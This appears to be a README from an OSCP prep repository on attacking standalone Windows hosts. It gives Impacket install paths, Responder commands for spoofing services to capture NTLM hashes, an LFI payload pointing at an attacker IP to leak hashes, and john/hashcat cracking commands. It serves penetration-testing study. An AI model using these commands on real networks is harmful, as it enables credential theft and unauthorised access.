# Windows Resources 
Use this folder for compromising a standalone Windows box. For domain compromising, see [Active_Directory](https://github.com/Scr1ptK1ddie/OSCPprep/tree/main/ActiveDirectory) folder.   

[Windows Reverse Shells](https://github.com/Scr1ptK1ddie/OSCPprep/blob/main/Windows/Windows_Reverse_Shells.md)  

[Windows Privilege Escalation](https://github.com/Scr1ptK1ddie/OSCPprep/blob/main/Windows/Windows_Priv_Esc.md) 


## Tools
### Impacket 
https://github.com/SecureAuthCorp/impacket

    apt install impacket-scripts

Local Locations:

    /usr/share/doc/python3-impacket/examples   
    
### Responder (not allowed on the OSCP exam, but a common pen testing tool)   
Allows you to spoof various services then capture hashes from devices that try to authenticate to those.  
Install:   

    git clone https://github.com/lgandx/Responder   
 Usage:   

     sudo responder.py -I eth0   #start on specified interface. Hashes will be captured when a device tries to authenticate to resources on the network.               
    
You might be able to use a LFI vulnerability to request a resource and capture a hash using Responder. Ex - http://site.com/?page=//10.10.14.25/somefile           
Captured hashes will be stored in the logs folder, in a .txt file named for the protcol-hash type- and IP captured from.     
Crack Hashes from responder:     

    john hashes.txt   #John the Ripper willa utomatically detect the format of hashes collected by Responder.    
    hashcat -m 5500   #NTLMv1 (hashes captured from using a tool like Responder)     
    hashcat -m 5600   #NTLMv2 (hashes captured from using a tool like Responder) 
